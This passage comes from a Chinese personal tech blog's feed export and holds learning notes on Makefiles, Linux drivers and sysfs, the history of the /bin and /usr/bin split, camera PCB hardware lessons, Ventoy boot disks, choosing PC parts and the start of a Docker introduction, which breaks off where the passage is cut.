class="hljs makefile">CXXFLAGS += -I../<span class="hljs-keyword">include</span> -fexec-charset=GBK -finput-charset=UTF-8<br><span class="hljs-keyword">vpath</span> %.h ../<span class="hljs-keyword">include</span><br><span class="hljs-keyword">vpath</span> %.a ../lib<br><br><span class="hljs-section">../sudoku: main.o test.o -lsudoku</span><br>    <span class="hljs-variable">$(CXX)</span> -o <span class="hljs-variable">$@</span> <span class="hljs-variable">$^</span><br></code></pre></td></tr></table></figure><p>总的Makefile</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-meta"><span class="hljs-keyword">.PHONY</span>: all clean</span><br><br><span class="hljs-section">all: subsrc</span><br><br><span class="hljs-section">subsrc: sublib</span><br>    <span class="hljs-variable">$(MAKE)</span> -C src<br><br><span class="hljs-section">sublib:</span><br>    <span class="hljs-variable">$(MAKE)</span> -C lib<br><br><span class="hljs-section">clean:</span><br>    -rm *.exe src/*.o lib/*.o lib/*.a <br></code></pre></td></tr></table></figure><p>其中</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-variable">$(MAKE)</span> -C subdir<br></code></pre></td></tr></table></figure><p>这一指令会自动进入subdir文件夹然后执行make。</p><p>可以通过<code>export</code>指令向子项目的make传递变量。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-keyword">export</span> var  <span class="hljs-comment"># 传递var</span><br><span class="hljs-keyword">export</span>         <span class="hljs-comment"># 传递所有变量</span><br><span class="hljs-keyword">unexport</span>    <span class="hljs-comment"># 取消传递</span><br></code></pre></td></tr></table></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><h1 id="后续学习过程"><a href="#后续学习过程" class="headerlink" title="后续学习过程"></a>后续学习过程</h1><p>读一些开源项目的Makefile</p><p><strong>redis</strong>:<a href="https://github.com/redis/redis">https://github.com/redis/redis</a></p><p><strong>ffmpeg</strong>:<a href="https://github.com/FFmpeg/FFmpeg">https://github.com/FFmpeg/FFmpeg</a></p><p><strong>aubio</strong>:<a href="https://github.com/aubio/aubio">https://github.com/aubio/aubio</a></p><p><strong>libav</strong>:<a href="https://github.com/libav/libav">https://github.com/libav/libav</a></p><p><strong>OpenH264</strong>:<a href="https://github.com/cisco/openh264">https://github.com/cisco/openh264</a></p><p><strong>TinyVM</strong>:<a href="https://github.com/jakogut/tinyvm">https://github.com/jakogut/tinyvm</a></p><p><strong>TinyXML2</strong>:<a href="https://github.com/leethomason/tinyxml2">https://github.com/leethomason/tinyxml2</a></p>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux驱动开发(1)——什么是驱动</title>
    <link href="/2024/04/16/Linux%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91-1-%E2%80%94%E2%80%94%E4%BB%80%E4%B9%88%E6%98%AF%E9%A9%B1%E5%8A%A8/"/>
    <url>/2024/04/16/Linux%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91-1-%E2%80%94%E2%80%94%E4%BB%80%E4%B9%88%E6%98%AF%E9%A9%B1%E5%8A%A8/</url>
    
    <content type="html"><![CDATA[<p>Linux驱动开发手册</p><span id="more"></span><h1 id="什么是驱动"><a href="#什么是驱动" class="headerlink" title="什么是驱动"></a>什么是驱动</h1><p><strong>驱动是对要硬件的抽象</strong></p><p><strong>对于一个驱动而言，最重要的是使得硬件可以使用，而不是确定如何去使用硬件</strong>。如何使用硬件是由上层软件来决定的。而作为一个驱动而言，最终要的是使得硬件变得可用。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404162050352.png"></p><p>字符设备 (char device) 是一种最常见的硬件抽象。</p><p><code>/dev</code> 目录下的设备节点文件就是内核导出给用户空间的访问设备驱动的接口。</p><p>设备节点文件中有三个基本信息：</p><ul><li><p>Type，用于标识是 block 还是 char device;</p></li><li><p>Major number，用于标志是那一类 char deivce;</p></li><li><p>Minor number，用于标志是哪一个 char device;</p></li></ul><h1 id="各类虚拟文件系统"><a href="#各类虚拟文件系统" class="headerlink" title="各类虚拟文件系统"></a>各类虚拟文件系统</h1><p>在 Linux 中多种虚拟文件系统，其中有：</p><ul><li><code>/proc</code> 目录，这个伪文件系统主要提供了<strong>进程以及进程信息等内容的查看</strong></li><li><code>/sys</code> 目录，这个伪文件系统挂载了 <code>sysfs</code> ，提供了 Linux 系统中硬件的层级视图</li></ul><h2 id="sysfs伪文件系统"><a href="#sysfs伪文件系统" class="headerlink" title="sysfs伪文件系统"></a>sysfs伪文件系统</h2><p>Linux 2.6以后的内核引入了sysfs文件系统，sysfs被看成是与proc、devfs和devpty同类别的文件系统，该文件系统是一个虚拟的文件系统，它可以产生一个包括所有系统硬件的层级视图，与提供进程和状态信息的proc文件系统十分类似。sysfs把连接在系统上的设备和总线组织成为一个分级的文件，它们可以由用户空间存取，向用户空间导出内核数据结构以及它们的属性。sysfs的一个目的就是展示设备驱动模型中各组件的层次关系，其顶级目录包括block、bus、dev、devices、class、fs、kernel、power和firmware等。</p><p>block目录包含所有的块设备；devices目录包含系统所有的设备，并根据设备挂接的总线类型组织成层次结构；bus目录包含系统中所有的总线类型；class目录包含系统中的设备类型（如网卡设备、声卡设备、输入设备等）。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="https://zhuanlan.zhihu.com/p/499459919">知乎</a></li><li>《Linux设备驱动程序设计》</li></ul>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
      <category>驱动开发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>译——了解/bin-/sbin和/usr/bin和/usr/sbin之间的关系</title>
    <link href="/2024/04/16/%E4%BA%86%E8%A7%A3-bin-sbin%E5%92%8C-usr-bin%E5%92%8C-usr-sbin%E4%B9%8B%E9%97%B4%E7%9A%84%E5%85%B3%E7%B3%BB/"/>
    <url>/2024/04/16/%E4%BA%86%E8%A7%A3-bin-sbin%E5%92%8C-usr-bin%E5%92%8C-usr-sbin%E4%B9%8B%E9%97%B4%E7%9A%84%E5%85%B3%E7%B3%BB/</url>
    
    <content type="html"><![CDATA[<p>为什么？Linux中的操作系统目录结构如此繁琐？</p><span id="more"></span><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>这是一封关于Unix和Linux文件结构历史的电子邮件。以下是其中文翻译：</p><hr><p>David Collier在2010年11月30日15:58:00写道：</p><blockquote><p>我看到busybox将其链接分散在这四个目录中。</p><p>有没有一个简单的规则来决定每个链接位于哪个目录中……</p><p>例如，我看到kill在&#x2F;bin中，而killall在&#x2F;usr&#x2F;bin中……我不明白这其中的逻辑。</p></blockquote><p>你知道Ken Thompson和Dennis Ritchie是如何在1969年的PDP-7上创建Unix的吗？</p><p>好吧，大约在1971年，他们升级到了一台配备了一对RK05磁盘包（每个1.5兆字节）的PDP-11用于存储。</p><p>当操作系统变得太大而无法适应第一个RK05磁盘包（他们的根文件系统）时，他们让其“泄漏”到第二个磁盘包中，这就是所有用户主目录所在的位置（这就是为什么该挂载被称为&#x2F;usr）。他们在那里复制了所有的操作系统目录（&#x2F;bin、&#x2F;sbin、&#x2F;lib、&#x2F;tmp……），并将文件写入这些新目录，因为他们的原始磁盘空间不足。当他们获得第三个磁盘时，他们将其挂载在&#x2F;home上，并将所有用户目录重新定位到那里，以便操作系统可以消耗两个磁盘上的所有空间，并增长到整整三兆字节（哦哇！）。</p><p>当然，他们制定了规则：“当系统首次启动时，它必须能够启动到足够的状态，以便能够在&#x2F;usr上挂载第二个磁盘，所以不要把像mount这样的命令放在&#x2F;usr&#x2F;bin中，否则我们在启动系统时会遇到先有鸡还是先有蛋的问题。”这相当简单明了。这也非常特定于35年前的v6 Unix。</p><p>&#x2F;bin与&#x2F;usr&#x2F;bin的分割（以及所有其他分割）是这一情况的产物，这是20世纪70年代的一个实现细节，这个细节被几十年来从未质疑过自己为什么要做这些事情的官僚们延续了下来。在Linux被发明之前，这种做法就已经没有意义了，原因有多个：</p><p>1）早期的系统启动是initrd和initramfs的职责，它们处理“此文件需要在该文件之前”的问题。我们已经有了一个可以启动主系统的临时系统。</p><p>2）共享库（由伯克利大学的人引入）阻止你独立升级&#x2F;lib和&#x2F;usr&#x2F;bin部分。这两个分区必须匹配，否则它们将无法工作。1974年的情况并非如此，因为当时一切都是静态链接的，所以它们在一定程度上是独立的。</p><p>3）便宜的零售硬盘在1990年左右超过了100兆字节，而分区调整软件也在那时出现了（Partition Magic 3.0于1997年发布）。</p><p>当然，一旦分割存在，一些人就制定了其他规则来证明其合理性。根目录用于你从上游获得的操作系统内容，而&#x2F;usr用于你的站点本地文件。然后，&#x2F;用于你从AT&amp;T获得的内容，&#x2F;usr用于你的发行版（如IBM AIX、Dec Ultrix或SGI Irix）添加到其中的内容，而&#x2F;usr&#x2F;local用于你的特定安装文件。然后，有人决定&#x2F;usr&#x2F;local不是一个安装新软件包的好地方，所以我们添加了&#x2F;opt！我还在等待&#x2F;opt&#x2F;local的出现……</p><p>当然，在30年的时间里，这种分割产生了一些有趣的发行版特定规则的出现和消失，比如“&#x2F;tmp在重启之间会被清除，但&#x2F;usr&#x2F;tmp不会”。（当然，在Ubuntu上，&#x2F;usr&#x2F;tmp并不存在，而在Gentoo上，&#x2F;usr&#x2F;tmp是指向&#x2F;var&#x2F;tmp的符号链接，现在它具有“重启之间不会被清除”的规则。是的，所有这些都早于tmpfs。这与只读根文件系统有关，在这种情况下，&#x2F;usr总是只读的，而&#x2F;var是你的可写空间，&#x2F;在大多数情况下都是只读的，除了&#x2F;etc的某些部分，他们试图将其移动到&#x2F;var，但实际上，将&#x2F;etc符号链接到&#x2F;var&#x2F;etc的情况更为常见……）</p><p>像Linux基金会这样的标准官僚机构（多年前在其不断增长的吸积盘中消耗了自由标准集团）乐于记录并增加这种复杂性，而从未试图理解它首先存在的原因。“Ken和Dennis因为PDP-11上的RK05磁盘包太小，而将他们的操作系统泄漏到了相当于家的位置”这句话，他们根本听不懂。</p><p>我相当肯定，busybox安装只是将二进制文件放在历史上其他版本的二进制文件所在的位置。现在再也没有任何实际原因了。就我个人而言，我在自己组建的系统上，会将&#x2F;bin、&#x2F;sbin和&#x2F;lib符号链接到它们在&#x2F;usr中的对应位置。嵌入式开发人员会尝试理解和简化……</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="http://lists.busybox.net/pipermail/busybox/2010-December/074114.html">原文</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
      <category>翻译</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>常见的算法总结</title>
    <link href="/2024/04/16/%E5%B8%B8%E8%A7%81%E7%9A%84%E7%AE%97%E6%B3%95%E6%80%BB%E7%BB%93/"/>
    <url>/2024/04/16/%E5%B8%B8%E8%A7%81%E7%9A%84%E7%AE%97%E6%B3%95%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="https://www.runoob.com/w3cnote/quick-sort.html">快速排序</a></li><li><a href="https://www.runoob.com/w3cnote/implementation-of-merge-sort.html">并归排序</a></li><li><a href="https://www.runoob.com/w3cnote/bubble-sort.html">冒泡排序</a></li><li><a href="https://www.runoob.com/w3cnote/sort-algorithm-summary.html">排序总结</a></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>记相机项目硬件上遇到的问题以及总结</title>
    <link href="/2024/04/15/%E8%AE%B0%E7%9B%B8%E6%9C%BA%E9%A1%B9%E7%9B%AE%E7%A1%AC%E4%BB%B6%E4%B8%8A%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/"/>
    <url>/2024/04/15/%E8%AE%B0%E7%9B%B8%E6%9C%BA%E9%A1%B9%E7%9B%AE%E7%A1%AC%E4%BB%B6%E4%B8%8A%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>记载总结相机这个项目在硬件设计上遇到的问题，以及总结解决方案。</p><span id="more"></span><h1 id="第一次硬件测试"><a href="#第一次硬件测试" class="headerlink" title="第一次硬件测试"></a>第一次硬件测试</h1><p>今天在嘉立创打印的 <code>PCB</code> 板到了，但是在初次的测试中发现了一些问题：</p><ul><li>没有提前了解关于电源的使用情况，导致电源线连接不上，导致测试无法进行。并且没有了解到<code>锂电502550</code>电池的使用方法，<strong>也就是说在写PCB之前没有去了解如何使用相关的电池</strong>，因为之前都是直接插电来使用的。</li><li>摄像头 <code>PCB</code> 板的绘制没有摆好元器件的位置。</li><li>第一次设计的显示器板的长度没有设计好，使得该板中的按键已经放不下了</li></ul><h1 id="关于电源的选择"><a href="#关于电源的选择" class="headerlink" title="关于电源的选择"></a>关于电源的选择</h1><p>由于我制作的是一个相机，所以应该选择一个便于移动的电源。在 <code>wikipedia</code> 上可以查到有哪些电源可以选择：<a href="https://en.wikipedia.org/wiki/List_of_battery_sizes">https://en.wikipedia.org/wiki/List_of_battery_sizes</a></p><h2 id="关于电源的选择上，如果如果是需要可以移动的产片，可以选择：-纽扣电池-航模电池：注意很多-diy-项目在使用这种电池的时候，都是直接将引线焊接到-pcb-板上的-TYPE-C-接口，这种接口需要特别注意：一个是输出的电压的问题，我看大多数的-diy-项目都是使用直接输出-5V-电压的充电器，而不是使用普通的手机等等产品的电源适配器"><a href="#关于电源的选择上，如果如果是需要可以移动的产片，可以选择：-纽扣电池-航模电池：注意很多-diy-项目在使用这种电池的时候，都是直接将引线焊接到-pcb-板上的-TYPE-C-接口，这种接口需要特别注意：一个是输出的电压的问题，我看大多数的-diy-项目都是使用直接输出-5V-电压的充电器，而不是使用普通的手机等等产品的电源适配器" class="headerlink" title="关于电源的选择上，如果如果是需要可以移动的产片，可以选择：- 纽扣电池- 航模电池：注意很多 diy 项目在使用这种电池的时候，都是直接将引线焊接到 pcb 板上的- TYPE-C 接口，这种接口需要特别注意：一个是输出的电压的问题，我看大多数的 diy 项目都是使用直接输出 5V 电压的充电器，而不是使用普通的手机等等产品的电源适配器**"></a>关于电源的选择上，如果如果是需要可以移动的产片，可以选择：<br>- 纽扣电池<br>- 航模电池：<strong>注意很多 diy 项目在使用这种电池的时候，都是直接将引线焊接到 pcb 板上的<br>- TYPE-C 接口，这种接口需要特别注意：</strong>一个是输出的电压的问题，我看大多数的 diy 项目都是使用直接输出 5V 电压的充电器，而不是使用普通的手机等等产品的电源适配器**</h2><h2 id="Type-C-接口"><a href="#Type-C-接口" class="headerlink" title="Type-C 接口"></a>Type-C 接口</h2><p>这个接口需要特别注意，其有三者引脚数：</p><ul><li>6 Pin的接口</li><li>16 Pin的接口</li><li>24 Pin的接口</li></ul><p>其中，6 Pin的接口只可以用来充电，无法进行数据传输<br><br>16 Pin的接口二者都可以<br><br>24 Pin的接口也是都可以，但是传输的速度要快于 12 Pin的接口。<br></p><p>下面是三种引脚的接线图：</p><h3 id="6-Pin-接口"><a href="#6-Pin-接口" class="headerlink" title="6 Pin 接口"></a>6 Pin 接口</h3><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/Screenshot_2024-05-24-03-50-46-293_tv.danmaku.bil.jpg"></p><h3 id="16-Pin-接口"><a href="#16-Pin-接口" class="headerlink" title="16  Pin 接口"></a>16  Pin 接口</h3><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/Screenshot_2024-05-24-03-50-41-199_tv.danmaku.bil.jpg"></p><h3 id="24-Pin-接口"><a href="#24-Pin-接口" class="headerlink" title="24 Pin 接口"></a>24 Pin 接口</h3><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/Screenshot_2024-05-24-03-49-48-076_tv.danmaku.bil.jpg"></p><p>同时需要注意的是，如果直接使用类似于手机充电器这样子的一般的充电器来提供电源的话则需要在被充电的设备上使用一块<strong>协议芯片</strong>，这个芯片可以帮助电源适配器和设备进行匹配，这样就可以传输合适的电压了。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202405250150150.png"></p><p><strong>如果想要直接传输 5V 电压，则需要 cc 引脚接 5.1K 电阻，此时则是默认输出 5V 电压。可以两个 cc 引脚都接 5.1K 的电阻，或者是 cc1 接 5.1K电阻，然后 cc2 接底。最好还是接上两个电阻</strong>。或者是使用一个指定输出 5V 的电源适配器。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://blog.csdn.net/sjm005/article/details/126709117">https://blog.csdn.net/sjm005/article/details/126709117</a></li><li><a href="https://www.shoudian.org/thread-1543627-1-1.html">https://www.shoudian.org/thread-1543627-1-1.html</a></li><li><a href="https://blog.csdn.net/weifengdq/article/details/95965050">https://blog.csdn.net/weifengdq/article/details/95965050</a></li></ul><h1 id="焊接"><a href="#焊接" class="headerlink" title="焊接"></a>焊接</h1><p>焊接的时候需要注意：</p><ul><li>如果是有方向性的元器件一定要注意方向性，否则焊上去之后根本使用不了。<ul><li>各种二极管</li><li>LED灯</li><li>各种芯片</li><li>有一些电容也是有正负的</li></ul></li><li>焊接的时候需要注意元器件的焊接的顺序：<strong>焊接元器件不应该根据元器件焊接的难易程度来进行判断</strong><ul><li>先焊一些小的元器件，防止后面焊接大的元器件的时候，有元器件对焊枪进行阻挡</li><li>通过原理图来焊接元器件，<strong>焊接的时候应该需要从电源开始，这样方便对 pcb 板进行测试</strong></li></ul></li></ul><h2 id="元器件的焊接"><a href="#元器件的焊接" class="headerlink" title="元器件的焊接"></a>元器件的焊接</h2><ol><li>焊接引脚多、引脚小等不易焊接的元器件的时候应该在焊接完成之后<strong>使用万用表对其进行短路测试，防止出现短接情况</strong></li></ol><h1 id="连接器"><a href="#连接器" class="headerlink" title="连接器"></a>连接器</h1><p>可以通过不同连接器的组合来实现更加好的功能。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul><li>在绘制 <code>PCB</code> 之前，需要先了解相关的电源、电池、摄像头等硬件的使用方法，并且在设计时注意元器件的位置。</li><li><code>PCB</code> 设计、原理图设计实际上是一体的，因为<code>PCB</code> 板上的电路的连接是通过原理图来实现的。所以在绘制原理图的时候就需要考虑好元器件的位置，以及电路的连接。<strong>尤其是需要将引脚引出的时候，如何去分配引脚非常重要</strong></li><li>通过嘉立创绘制<strong>多块电路板</strong>的时候可以通过 <code>PCB</code> 板的拼接来实现，这样可以节省成本。</li></ul>]]></content>
    
    
    <categories>
      
      <category>硬件</category>
      
      <category>项目</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>如何快速制作一个启动盘</title>
    <link href="/2024/04/15/%E5%A6%82%E4%BD%95%E5%BF%AB%E9%80%9F%E5%88%B6%E4%BD%9C%E4%B8%80%E4%B8%AA%E5%90%AF%E5%8A%A8%E7%9B%98/"/>
    <url>/2024/04/15/%E5%A6%82%E4%BD%95%E5%BF%AB%E9%80%9F%E5%88%B6%E4%BD%9C%E4%B8%80%E4%B8%AA%E5%90%AF%E5%8A%A8%E7%9B%98/</url>
    
    <content type="html"><![CDATA[<p>如何快速的制作一个启动盘？使用Ventoy。</p><span id="more"></span><h2 id="如何快速制作一个启动盘"><a href="#如何快速制作一个启动盘" class="headerlink" title="如何快速制作一个启动盘"></a>如何快速制作一个启动盘</h2><p>—— 制作一个启动盘，只需一步到位。</p><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p><a href="https://www.ventoy.net/cn/index.html"><strong>Ventoy</strong></a> 是一个开源的启动盘制作工具。优势如下：</p><ul><li>使用简单。将系统镜像（.iso 文件）拷进 U 盘即可。</li><li>多系统<ul><li>可以一次放进多个镜像，自动创建包含多个系统的启动菜单</li><li>目前已测试过支持包括主流 Windows、服务器版 Windows、Debian、Ubuntu、CentOS、RHEL、Deepin，VMware ESXi 等 202 个系统</li></ul></li><li>支持超过 4GB 的 ISO 文件</li><li>直接从 ISO 文件启动，无需解开</li><li>快速 （拷贝文件有多快就有多快）</li><li>不影响 U 盘日常普通使用</li></ul><h2 id="下载安装"><a href="#下载安装" class="headerlink" title="下载安装"></a>下载安装</h2><p>可在软件仓库的 <a href="https://github.com/ventoy/Ventoy/releases"><strong>Release</strong></a> 页面下载软件。</p><p>下载完成后，打开压缩包内的 <code>Ventoy2Disk.exe</code> 并选择 U 盘，点击 <code>Install</code> 安装即可。</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>直接把镜像文件拷贝进 U 盘就行了。</p><h2 id="参考与致谢"><a href="#参考与致谢" class="headerlink" title="参考与致谢"></a>参考与致谢</h2><ul><li><a href="https://telegra.ph/Ventoy---%E5%BC%80%E6%BA%90-U-%E7%9B%98%E5%90%AF%E5%8A%A8%E7%9B%98%E5%88%B6%E4%BD%9C%E5%B7%A5%E5%85%B7%E6%94%AF%E6%8C%81%E5%90%AF%E5%8A%A8%E5%A4%9A%E4%B8%AA%E7%B3%BB%E7%BB%9F%E8%BF%98%E8%83%BD%E5%BD%93%E6%99%AE%E9%80%9A-U-%E7%9B%98%E4%BF%9D%E5%AD%98%E6%96%87%E4%BB%B6WinLinux---%E5%B0%8F%E4%BC%97%E8%BD%AF%E4%BB%B6-04-30">Ventoy - 开源 U 盘启动盘制作工具，支持启动多个系统，还能当普通 U 盘保存文件</a></li></ul><blockquote><p>原文地址：<a href="https://wiki-power.com/">https://wiki-power.com/</a><br>本篇文章受 <a href="https://creativecommons.org/licenses/by/4.0/deed.zh">CC BY-NC-SA 4.0</a> 协议保护，转载请注明出处。</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>如何自己配置一台电脑</title>
    <link href="/2024/04/14/%E5%A6%82%E4%BD%95%E8%87%AA%E5%B7%B1%E9%85%8D%E7%BD%AE%E4%B8%80%E5%8F%B0%E7%94%B5%E8%84%91/"/>
    <url>/2024/04/14/%E5%A6%82%E4%BD%95%E8%87%AA%E5%B7%B1%E9%85%8D%E7%BD%AE%E4%B8%80%E5%8F%B0%E7%94%B5%E8%84%91/</url>
    
    <content type="html"><![CDATA[<p>如何自己配置一台电脑</p><span id="more"></span><h2 id="如何配一台电脑"><a href="#如何配一台电脑" class="headerlink" title="如何配一台电脑"></a>如何配一台电脑</h2><h2 id="1-选机箱"><a href="#1-选机箱" class="headerlink" title="1. 选机箱"></a>1. 选机箱</h2><p><img src="https://media.wiki-power.com/img/20200428102157.png"></p><p>注意：</p><ul><li>电源须下置</li><li>尽量有背部走线设计</li><li>日常使用小机箱 &#x2F; 中塔较为合适</li></ul><h2 id="2-选主板-CPU"><a href="#2-选主板-CPU" class="headerlink" title="2. 选主板 &#x2F;CPU"></a>2. 选主板 &#x2F;CPU</h2><p>参考 <a href="http://www.lotpc.com/tag/5923_1.html"><strong>CPU 天梯图</strong></a>，根据需求选取。注意：</p><ul><li>相同价位下，玩游戏选 Intel，不玩游戏 AMD</li><li>CPU 可以买散片（一般不会有假货），散片须自备散热器</li><li>如自备散热器需注意机箱的 CPU 散热器限高</li></ul><p>选完 CPU 选主板。注意：</p><ul><li>AMD 芯片配 AMD 主板，Intel 芯片配 Intel 主板</li><li>注意机箱兼容的主板尺寸（ATX, Micro-ATX, MINI-ITX）</li></ul><p>主板 &#x2F;CPU 可以买套装，比较实惠。</p><h2 id="3-选显卡"><a href="#3-选显卡" class="headerlink" title="3. 选显卡"></a>3. 选显卡</h2><p>参考 <a href="http://www.lotpc.com/tag/5921_1.html"><strong>显卡天梯图</strong></a>，根据需求选取。注意：</p><ul><li>如果 CPU 有核显，且对配置要求不高，则独立显卡非必须</li><li>采用 NVIDIA 芯片的称之为 N 卡，而 AMD 芯片称之为 A 卡</li><li>相同价位下，绘图渲染工作用 A 卡，玩游戏用 N 卡</li><li>N 卡高端型号比较丰富，且功耗较低；A 卡性价比高</li><li>注意机箱的显卡限长</li></ul><h2 id="4-选内存条"><a href="#4-选内存条" class="headerlink" title="4. 选内存条"></a>4. 选内存条</h2><p>内存条基本参数要求：</p><ul><li>DDR4 2400 频数</li><li>注意区分台式机 &#x2F; 笔记本内存条</li><li>根据需求，基础 16GB，高性能 32GB 以上</li><li>注意主板的内存插口数量</li><li>推荐金士顿 &#x2F; 三星的内存条</li></ul><h2 id="5-选硬盘"><a href="#5-选硬盘" class="headerlink" title="5. 选硬盘"></a>5. 选硬盘</h2><p>硬盘分固态（SSD）与机械（HDD）。因为相同容量下， SSD 比 HDD 贵而且传输速率高，所以通常将系统和软件存放于 SSD，不常用而体积大的资料文档存放于 HDD.</p><p>SSD 基本参数要求：</p><ul><li>M.2 接口（NVMe 协议）</li><li>根据需求选容量</li><li>注意对比读写速率</li><li>推荐三星的 SSD</li></ul><p>HDD 基本参数要求：</p><ul><li>SATA 3.0 接口</li><li>7200rpm 转速</li><li>理论传输速率 6Gbit&#x2F;s</li><li>根据需求选容量</li><li>推荐希捷的 HDD</li></ul><h2 id="6-选电源"><a href="#6-选电源" class="headerlink" title="6. 选电源"></a>6. 选电源</h2><p>注意：</p><ul><li>根据机箱限定的尺寸选取</li><li>（300W 起步）所有硬件功率累加，再多 100W 冗余就足够</li><li>注意转换效率：白、铜、银、金、白金、钛金依次递增，价格越贵，电费越省</li></ul><h2 id="7-其他配件"><a href="#7-其他配件" class="headerlink" title="7. 其他配件"></a>7. 其他配件</h2><p>无线模块</p><ul><li>最好支持 Wi-Fi 6</li><li>注意接口类型</li></ul><p>开机卡</p><ul><li>注意接口类型</li><li></li></ul><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="https://wiki-power.com/%E5%A6%82%E4%BD%95%E9%85%8D%E4%B8%80%E5%8F%B0%E7%94%B5%E8%84%91/#5">https://wiki-power.com/%E5%A6%82%E4%BD%95%E9%85%8D%E4%B8%80%E5%8F%B0%E7%94%B5%E8%84%91/#5</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Docker 基础知识</title>
    <link href="/2024/04/14/Docker%20%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <url>/2024/04/14/Docker%20%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    
    <content type="html"><![CDATA[<p>关于Docker的基础知识</p><span id="more"></span><p><img src="https://media.wiki-power.com/img/20210116153041.png"></p><p>众所周知，软件开发中最麻烦的事情之一，就是环境的配置。运行环境的差异，可能导致意想不到的结果，而使用 Docker 可以避免出现这样的问题。</p><h2 id="Docker-与容器化技术"><a href="#Docker-与容器化技术" class="headerlink" title="Docker 与容器化技术"></a>Docker 与容器化技术</h2><p>Docker 把软件本身和它所需的运行环境打包起来，使用的时候就不需要再去配置环境了（因为环境都在包里），这样就能确保你的环境和开发者的一模一样，避免因运行环境差异而造成问题。</p><p>Docker 使用的是 <strong>容器化技术</strong>。当我们谈论容器化技术时，可以将其类比 <strong>集装箱</strong>。它是一种 <strong>标准化</strong> 的大型容器，可以在各种运输工具（如船舶、火车、卡车）之间进行简单的装载和卸载，而无需考虑其内部的具体内容组成。类似地，容器化技术将应用程序及其所有依赖项打包在一个独立的、可移植的环境中，称为容器。</p><p>容器化技术的主要目标是实现应用程序的快速部署、可扩展性和环境隔离。通过将应用程序和相关依赖项打包在一个容器中，我们可以确保在不同的计算机或服务器上以一致的方式运行应用程序，而无需担心环境差异或依赖冲突的问题。这使得开发人员可以更快速地交付应用程序，同时也简化了应用程序的部署和管理过程。</p><p>容器化技术的一大优势是它提供了轻量级的虚拟化解决方案。与传统的虚拟机相比，容器化技术更加轻巧且资源消耗更少。每个容器都运行在宿主操作系统的相同内核上，共享操作系统的资源，因此容器启动更快、占用更少的内存，也可以在同一台机器上同时运行多个容器。</p><p>Docker 是目前比较流行的容器化解决方案。它主要包含三要素，分别是 Image（镜像）、Container（容器）和 Repository（仓库）。</p><ul><li><strong>Image（镜像）</strong>：镜像是一个可执行文件，包含了应用程序及其依赖的所有文件系统（代码、runtime、系统工具、库文件）和配置。我们可以将镜像看作是容器的模板，通过它可以创建多个不同的容器实例。</li><li><strong>Container（容器）</strong>：容器是由镜像创建的运行实例。每个容器都是相互隔离的、独立运行的环境，可以在其中运行应用程序。</li><li><strong>Repository（仓库）</strong>：仓库是用来存储和分享镜像。我们可以将自己创建的镜像推送到仓库中，也可以从仓库中拉取他人创建的镜像。</li></ul><p>容器与镜像的关系，就像面向对象编程中的对象与类。</p><h2 id="Docker-的安装与配置"><a href="#Docker-的安装与配置" class="headerlink" title="Docker 的安装与配置"></a>Docker 的安装与配置</h2><p>在安装 Docker 